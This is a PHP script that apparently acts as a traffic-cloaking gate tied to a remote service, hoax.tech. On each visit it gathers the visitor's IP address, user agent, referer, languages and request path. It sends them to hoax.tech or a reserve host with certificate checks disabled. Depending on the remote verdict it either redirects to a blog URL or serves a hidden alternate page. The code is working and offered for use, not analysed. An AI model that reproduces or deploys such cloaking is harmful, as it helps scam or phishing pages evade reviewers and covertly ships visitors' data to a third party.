<?php
						define("HOAXCLID", md5(time().mt_rand()));
						$flow_hash = "a07fbc0f2ce100b72988ae22cae7da41";
						$data["referer"] = "NULL";
						$data["user_agent"] = "NULL";
						$data["utm"] = "NULL";
						$data["langs"] = "NULL";
						$data["ip"] = "NULL";					
						$data["url"] = "https://tommyinnit69.github.io/blog/";
						$data["clid"] = HOAXCLID;
						$data["basik_url"] = "https://hoax.tech/";
						$data["reserve_url"] = "https://reserve.hoax.tech/";

						if (isset($_POST["userAgent"])){
							$response = curl_send("json_hash",$_POST,$flow_hash,$data["basik_url"],$data["reserve_url"]);
							if($response == "black"){
								echo $data["url"];
							}
							exit;
						}

						function curl_send($urlstring,$data,$flow_hash,$url,$reserve_url){
							function curl_wrapper($urlstring,$data,$flow_hash,$curl_url){
								$json = json_encode($data); 
								$ch = curl_init();
								curl_setopt($ch, CURLOPT_URL, $curl_url."get_data?".$urlstring."=".$flow_hash);
								curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
								curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,1); 
								curl_setopt($ch, CURLOPT_POST, 1);
								curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
								curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
								curl_setopt($ch, CURLOPT_POSTFIELDS,$json);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
								$response  = curl_exec($ch);
								curl_close($ch);
								return $response;
							}

							$resp = curl_wrapper($urlstring,$data,$flow_hash,$url);
							if($resp){
								return $resp;
								}else{
									return curl_wrapper($urlstring,$data,$flow_hash,$reserve_url);
								}

							}

							function validate_url($cell){
								$url = filter_var($cell, FILTER_SANITIZE_URL);
								if (!filter_var($url, FILTER_VALIDATE_URL) === false) {
									return true;
									}else{
										return false;
									}
								}

								if(!empty($_SERVER["REQUEST_URI"])){
									if($_SERVER["REQUEST_URI"] != "/"){
										$data["utm"] = urldecode($_SERVER["REQUEST_URI"]);
									}
								}

								if(!empty($_SERVER["HTTP_REFERER"])){
									if(validate_url($_SERVER["HTTP_REFERER"])){
										$data["referer"] = parse_url($_SERVER["HTTP_REFERER"], PHP_URL_HOST);
									}
								}

								if(!empty($_SERVER["HTTP_USER_AGENT"])){ 
									$data["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
								}

								if(!empty($_SERVER["HTTP_ACCEPT_LANGUAGE"])){ 
									$data["langs"] = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
								}

								if (filter_var($_SERVER["REMOTE_ADDR"], FILTER_VALIDATE_IP)){

									if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
										$_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_CF_CONNECTING_IP"];
									}
									
									$data["ip"] = $_SERVER["REMOTE_ADDR"];
								}

								$response = curl_send("hash",$data,$flow_hash,$data["basik_url"],$data["reserve_url"]);

								if($response == "black"){
									include "assets.php";
									echo "<meta http-equiv='Refresh' content='0.3; url=".$data["url"]."' />";
									}else{
										include "index2.php";
									}
									?>